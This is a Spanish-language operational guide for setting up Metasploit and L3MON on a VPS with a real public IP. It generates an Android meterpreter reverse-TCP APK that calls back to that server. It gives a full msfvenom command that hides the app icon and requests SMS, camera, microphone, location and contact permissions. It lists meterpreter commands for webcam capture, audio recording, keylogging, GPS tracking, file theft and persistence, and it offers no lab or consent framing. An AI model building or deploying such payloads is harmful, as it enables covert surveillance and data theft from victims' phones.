# Guía de Instalación y Uso - Metasploit para Android 16

## Configuración Actual
- **VPS IP:** 194.163.135.124
- **Puertos:** 8080 (L3MON web), 4444 (Metasploit/L3MON socket), 5555 (adicional)
- **Contenedor:** Kali Linux con Dokploy

## Paso 1: Reconstruir el Contenedor

```bash
# En tu VPS
cd /ruta/a/controcelular
git pull
docker-compose down
docker-compose up -d --build
```

## Paso 2: Verificar que Metasploit esté Instalado

```bash
# Entrar al contenedor
docker exec -it hack-kalil3mon-sahdnp.1.tc97uvit7fbtybtfb5d9xjrit bash

# Verificar msfvenom
msfvenom --version

# Verificar msfconsole
msfconsole --version
```

## Paso 3: Generar APK Compatible con Android 16

```bash
# Dentro del contenedor
cd /root/L3MON-2

# Generar APK con tu IP pública
/generate_apk.sh 194.163.135.124 4444

# La APK se generará como android_payload.apk
# Copiarla para descargarla
cp android_payload.apk /root/L3MON-2/assets/webpublic/
```

## Paso 4: Verificar que el Listener esté Corriendo

```bash
# Verificar logs del listener
cat /tmp/msf_listener.log

# Verificar proceso
ps aux | grep msfconsole

# Si no está corriendo, iniciarlo manualmente
/start_listener.sh 4444
```

## Paso 5: Descargar la APK

```bash
# Desde tu navegador
http://194.163.135.124:8080/android_payload.apk

# O desde el contenedor
docker cp hack-kalil3mon-sahdnp.1.tc97uvit7fbtybtfb5d9xjrit:/root/L3MON-2/android_payload.apk ./
```

## Paso 6: Instalar y Probar en Android 16

1. **Habilitar instalación de fuentes desconocidas** en el dispositivo Android
2. **Instalar la APK** `android_payload.apk`
3. **Conceder todos los permisos** cuando la app los solicite
4. **Abrir la app** (se conectará automáticamente al servidor)

## Paso 7: Verificar Conexión en Metasploit

```bash
# Ver logs del listener en tiempo real
tail -f /tmp/msf_listener.log

# O entrar al contenedor y usar msfconsole interactivo
docker exec -it hack-kalil3mon-sahdnp.1.tc97uvit7fbtybtfb5d9xjrit bash
msfconsole
```

## Paso 8: Usar Meterpreter (Control Total)

Una vez conectado, tendrás acceso a:

```bash
# En msfconsole, cuando se conecte el dispositivo
sessions -l  # Listar sesiones activas
sessions -i 1  # Interactuar con sesión 1

# Comandos disponibles en Meterpreter:
help                    # Ver todos los comandos
sysinfo                 # Información del sistema
webcam_snap             # Tomar foto
webcam_stream           # Streaming de cámara
record_mic              # Grabar audio
screenshot              # Captura de pantalla
keyscan_start           # Iniciar keylogger
keyscan_dump            # Ver teclas presionadas
gps locate              # Ubicación GPS
geolocate               # Geolocalización
shell                   # Acceso a shell de Android
cd /sdcard              # Navegar archivos
download archivo.txt    # Descargar archivo
upload archivo.txt      # Subir archivo
android_hide_app_icon   # Ocultar icono de la app
persist -U              # Persistencia al reiniciar
```

## Solución de Problemas

### Error: "msfvenom: command not found"
```bash
# Metasploit no está instalado, reconstruir contenedor
docker-compose down
docker-compose up -d --build
```

### Error: "Connection refused"
```bash
# Verificar que el puerto esté abierto
sudo ufw allow 4444/tcp
sudo ufw reload

# Verificar que el contenedor esté escuchando
docker ps | grep hack-kalil3mon
netstat -tlnp | grep 4444
```

### Listener no inicia automáticamente
```bash
# Iniciarlo manualmente
docker exec -it hack-kalil3mon-sahdnp.1.tc97uvit7fbtybtfb5d9xjrit bash
/start_listener.sh 4444
```

### APK no se instala en Android 16
```bash
# Generar APK con más permisos explícitos
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=194.163.135.124 \
  LPORT=4444 \
  AndroidWipeUserData=false \
  AndroidHideAppIcon=true \
  AndroidPermissionCamera=true \
  AndroidPermissionReadSms=true \
  AndroidPermissionSendSms=true \
  AndroidPermissionCallLog=true \
  AndroidPermissionReadContacts=true \
  AndroidPermissionAccessCoarseLocation=true \
  AndroidPermissionAccessFineLocation=true \
  AndroidPermissionRecordAudio=true \
  AndroidPermissionReadPhoneState=true \
  AndroidPermissionAccessNetworkState=true \
  AndroidPermissionInternet=true \
  AndroidPermissionWriteExternalStorage=true \
  AndroidPermissionReadExternalStorage=true \
  -o android_payload_v2.apk
```

## Verificación de Servicios

```bash
# Ver todos los servicios corriendo
docker exec -it hack-kalil3mon-sahdnp.1.tc97uvit7fbtybtfb5d9xjrit bash
ps aux | grep -E "node|msfconsole"

# Ver logs de L3MON
docker logs hack-kalil3mon-sahdnp.1.tc97uvit7fbtybtfb5d9xjrit

# Ver logs de Metasploit
docker exec hack-kalil3mon-sahdnp.1.tc97uvit7fbtybtfb5d9xjrit cat /tmp/msf_listener.log
```

## Persistencia Automática

Los servicios se reinician automáticamente al:
- Reiniciar el contenedor
- Reiniciar la VPS
- Caídas del servicio

Configurado en `start.sh` y `docker-compose.yml` con `restart: unless-stopped`.
